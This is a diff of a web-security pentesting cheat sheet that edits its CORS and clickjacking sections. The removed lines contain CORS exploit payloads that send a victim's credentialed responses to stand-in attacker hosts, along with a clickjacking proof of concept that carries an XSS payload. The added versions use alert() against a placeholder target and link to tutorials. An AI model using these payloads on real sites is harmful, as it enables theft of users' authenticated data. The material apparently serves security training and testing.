@@ -2237,42 +2237,38 @@ Manually testing for XXE vulnerabilities generally involves
 **Classic CORS vulnerability**
 ```HTML
 <script>
-  var req = new XMLHttpRequest();
-  req.onload = reqListener;
-  req.open('get','$url/accountDetails',true);
-  req.withCredentials = true;
-  req.send();
-  function reqListener() {
-  location='/log?key='+this.responseText;
-  };
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','https://<TARGET-URL>',true);
+	req.withCredentials = true;
+	req.send();
+		
+	function reqListener() {
+		alert(this.responseText);
+	};
 </script>
 ```
 
 **CORS vulnerability with null origin**
 ```HTML
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
-  var req = new XMLHttpRequest();
-  req.onload = reqListener;
-  req.open('get','vulnerable-website.com/sensitive-victim-data',true);
-  req.withCredentials = true;
-  req.send();
-     
-  function reqListener() {
-  location='malicious-website.com/log?key='+this.responseText;
-  };</script>">
+		var req = new XMLHttpRequest();
+		req.onload = reqListener;
+		req.open('get','https://<TARGET-URL>',true);
+		req.withCredentials = true;
+		req.send();
+		
+		function reqListener() {
+			alert(this.responseText);
+		};
+	</script>">
 </iframe>
 ```
 
-**CORS vulnerability with trusted insecure protocols**
-```HTML
-<script>
-  document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
-</script>
-```
 
-**Tools**
+**Resources**
 - [Corsy](https://github.com/s0md3v/Corsy) Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations
-
+- [What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cors)
 
 
 ### <ins>Clickjacking</ins>
@@ -2298,27 +2294,8 @@ Manually testing for XXE vulnerabilities generally involves
 <iframe src="$url"></iframe>
 ```
 
-**Classic PoC + XSS**
-```HTML
-<style>
-  iframe {
-    position:relative;
-    width:$width_value;
-    height: $height_value;
-    opacity: $opacity;
-    z-index: 2;
-  }
-  div {
-    position:absolute;
-    top:$top_value;
-    left:$side_value;
-    z-index: 1;
-  }
-</style>
-<div>Click me</div>
-<iframe src="$url?name=<img src=1 onerror=alert(document.domain)>&email=hacker@attacker.website.com&subject=test&message=test#feedbackResult"></iframe>
-```
-
+**Resources**
+- [What is Clickjacking? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/clickjacking)
 
 
 ### <ins>DOM-based vulnerabilities</ins>
